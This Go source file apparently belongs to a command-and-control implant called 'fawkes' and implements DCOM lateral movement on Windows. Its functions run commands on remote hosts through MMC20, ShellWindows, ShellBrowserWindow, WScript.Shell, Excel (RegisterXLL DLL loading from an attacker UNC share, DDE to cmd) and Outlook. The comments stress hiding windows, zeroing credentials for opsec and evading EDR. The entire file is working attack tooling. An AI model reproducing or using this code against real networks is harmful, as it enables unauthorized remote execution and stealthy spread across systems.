//go:build windows
// +build windows

// dcom_methods.go implements DCOM lateral movement techniques:
// MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application.
// Core COM infrastructure is in dcom.go.

package commands

import (
	"fmt"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

// dcomExecMMC20 executes a command via MMC20.Application DCOM object.
// Path: Document.ActiveView.ExecuteShellCommand(command, dir, args, "7")
func dcomExecMMC20(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password) // opsec: clear password after use
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	mmc, authState, err := createRemoteCOM(args.Host, clsidMMC20, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create MMC20.Application on %s: %v%s", args.Host, err, hint)
	}
	defer mmc.Release()
	defer authState.cleanup() // opsec: zero credential buffers

	// Get Document property
	docResult, err := oleutil.GetProperty(mmc, "Document")
	if err != nil {
		return errorf("Failed to get Document: %v", err)
	}
	defer docResult.Clear()
	doc := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(doc)
	}

	// Get ActiveView property
	viewResult, err := oleutil.GetProperty(doc, "ActiveView")
	if err != nil {
		return errorf("Failed to get ActiveView: %v", err)
	}
	defer viewResult.Clear()
	view := viewResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(view)
	}

	// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
	// WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", args.Command, dir, args.Args, "7")
	if err != nil {
		return errorf("ExecuteShellCommand failed: %v", err)
	}

	return successf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand%s", args.Host, args.Command, args.Args, dir, credInfo)
}

// dcomExecShellWindows executes a command via ShellWindows DCOM object.
// Path: Item().Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password) // opsec: clear password after use
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	shellWin, authState, err := createRemoteCOM(args.Host, clsidShellWindows, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create ShellWindows on %s: %v%s", args.Host, err, hint)
	}
	defer shellWin.Release()
	defer authState.cleanup() // opsec: zero credential buffers

	// Get Item(0) — returns an Internet Explorer / Explorer window
	itemResult, err := oleutil.CallMethod(shellWin, "Item")
	if err != nil {
		return errorf("Failed to get Item: %v (requires an explorer.exe shell on target)", err)
	}
	defer itemResult.Clear()
	item := itemResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(item)
	}

	// Get Document
	docResult, err := oleutil.GetProperty(item, "Document")
	if err != nil {
		return errorf("Failed to get Document: %v", err)
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(docDisp)
	}

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return errorf("Failed to get Application: %v", err)
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(app)
	}

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
	if err != nil {
		return errorf("ShellExecute failed: %v", err)
	}

	return successf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo)
}

// dcomExecShellBrowser executes a command via ShellBrowserWindow DCOM object.
// Path: Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password) // opsec: clear password after use
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	browser, authState, err := createRemoteCOM(args.Host, clsidShellBrowserWd, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create ShellBrowserWindow on %s: %v%s", args.Host, err, hint)
	}
	defer browser.Release()
	defer authState.cleanup() // opsec: zero credential buffers

	// Get Document
	docResult, err := oleutil.GetProperty(browser, "Document")
	if err != nil {
		return errorf("Failed to get Document: %v", err)
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(docDisp)
	}

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return errorf("Failed to get Application: %v", err)
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(app)
	}

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
	if err != nil {
		return errorf("ShellExecute failed: %v", err)
	}

	return successf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo)
}

// dcomExecWScript executes a command via WScript.Shell DCOM object.
// Path: WScript.Shell.Run(command, windowStyle, waitOnReturn)
// Common fallback when MMC/Shell objects are blocked by EDR.
func dcomExecWScript(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password)
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	wsh, authState, err := createRemoteCOM(args.Host, clsidWScriptShell, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create WScript.Shell on %s: %v%s", args.Host, err, hint)
	}
	defer wsh.Release()
	defer authState.cleanup()

	// Build the full command string
	fullCmd := args.Command
	if args.Args != "" {
		fullCmd += " " + args.Args
	}

	// Run(strCommand, intWindowStyle, bWaitOnReturn)
	// WindowStyle 0 = SW_HIDE, WaitOnReturn false = async
	_, err = oleutil.CallMethod(wsh, "Run", fullCmd, 0, false)
	if err != nil {
		return errorf("WScript.Shell.Run failed: %v", err)
	}

	return successf("DCOM WScript.Shell executed on %s:\n  Command: %s\n  Method: WScript.Shell.Run%s", args.Host, fullCmd, credInfo)
}

// dcomExecExcel executes via Excel.Application DCOM object.
// Supports two sub-methods based on the command field:
//   - If command ends with .xll or .dll: uses RegisterXLL to load DLL into Excel process
//   - Otherwise: uses DDEInitiate to execute a command via DDE channel
//
// RegisterXLL is stealthier — payload lives inside the Excel process.
// DDEInitiate is more flexible — runs any command like other DCOM methods.
func dcomExecExcel(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password)
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	excel, authState, err := createRemoteCOM(args.Host, clsidExcelApp, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create Excel.Application on %s: %v\n  Note: Excel must be installed on the target%s", args.Host, err, hint)
	}
	defer excel.Release()
	defer authState.cleanup()

	// Make Excel invisible to avoid UI popup on target
	_, _ = oleutil.PutProperty(excel, "Visible", false)
	_, _ = oleutil.PutProperty(excel, "DisplayAlerts", false)

	// Determine method based on command content
	cmdLower := strings.ToLower(args.Command)
	if strings.HasSuffix(cmdLower, ".xll") || strings.HasSuffix(cmdLower, ".dll") {
		return dcomExcelRegisterXLL(excel, args, credInfo)
	}
	return dcomExcelDDEInitiate(excel, args, credInfo)
}

// dcomExcelRegisterXLL loads a DLL/XLL into the Excel process via RegisterXLL.
// The payload DLL must be accessible from the target (e.g., UNC path \\attacker\share\payload.dll).
func dcomExcelRegisterXLL(excel *ole.IDispatch, args dcomArgs, credInfo string) structs.CommandResult {
	_, err := oleutil.CallMethod(excel, "RegisterXLL", args.Command)
	if err != nil {
		return errorf("Excel.RegisterXLL failed: %v\n  Ensure the DLL path is accessible from %s (e.g., UNC path)", err, args.Host)
	}

	return successf("DCOM Excel.Application executed on %s:\n  DLL loaded: %s\n  Method: Excel.Application.RegisterXLL\n  Note: DLL loaded into Excel.exe process on target%s", args.Host, args.Command, credInfo)
}

// dcomExecOutlook executes a command via Outlook.Application DCOM object.
// Technique: Create Outlook.Application on remote host, then use CreateObject("Wscript.Shell")
// to obtain a WScript.Shell reference within Outlook's process context, then call .Run().
// This is an unusual lateral movement vector — EDR tools typically don't monitor Outlook
// for shell execution, making it less likely to be detected than MMC20 or ShellWindows.
// Requires Outlook to be installed on the target.
func dcomExecOutlook(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password)
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	outlook, authState, err := createRemoteCOM(args.Host, clsidOutlookApp, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create Outlook.Application on %s: %v\n  Note: Outlook must be installed on the target%s", args.Host, err, hint)
	}
	defer outlook.Release()
	defer authState.cleanup()

	// Use Outlook's CreateObject to instantiate WScript.Shell inside Outlook's process
	wshResult, err := oleutil.CallMethod(outlook, "CreateObject", "Wscript.Shell")
	if err != nil {
		return errorf("Outlook.CreateObject(\"Wscript.Shell\") failed: %v\n  Outlook's security settings may block CreateObject", err)
	}
	defer wshResult.Clear()
	wsh := wshResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(wsh)
	}

	// Build the full command string
	fullCmd := args.Command
	if args.Args != "" {
		fullCmd += " " + args.Args
	}

	// Run(strCommand, intWindowStyle, bWaitOnReturn)
	// WindowStyle 0 = SW_HIDE, WaitOnReturn false = async
	_, err = oleutil.CallMethod(wsh, "Run", fullCmd, 0, false)
	if err != nil {
		return errorf("Outlook WScript.Shell.Run failed: %v", err)
	}

	return successf("DCOM Outlook.Application executed on %s:\n  Command: %s\n  Method: Outlook.Application.CreateObject(\"Wscript.Shell\").Run\n  Note: Command runs inside Outlook.exe process context — less commonly monitored by EDR%s", args.Host, fullCmd, credInfo)
}

// dcomExcelDDEInitiate executes a command via DDE channel through Excel.
// Uses DDEInitiate to open a channel to cmd.exe, then DDEExecute to run the command.
func dcomExcelDDEInitiate(excel *ole.IDispatch, args dcomArgs, credInfo string) structs.CommandResult {
	// Build the full command for DDE execution
	fullCmd := args.Command
	if args.Args != "" {
		fullCmd += " " + args.Args
	}

	// DDEInitiate(App, Topic) — opens a DDE channel
	// App="cmd", Topic="/c <command>" triggers command execution
	channelResult, err := oleutil.CallMethod(excel, "DDEInitiate", "cmd", "/c "+fullCmd)
	if err != nil {
		return errorf("Excel.DDEInitiate failed: %v", err)
	}

	// Clean up the DDE channel
	if channelResult != nil && channelResult.Val != 0 {
		_, _ = oleutil.CallMethod(excel, "DDETerminate", channelResult.Val)
	}

	return successf("DCOM Excel.Application executed on %s:\n  Command: %s\n  Method: Excel.Application.DDEInitiate\n  Note: Command executed via DDE channel through Excel%s", args.Host, fullCmd, credInfo)
}
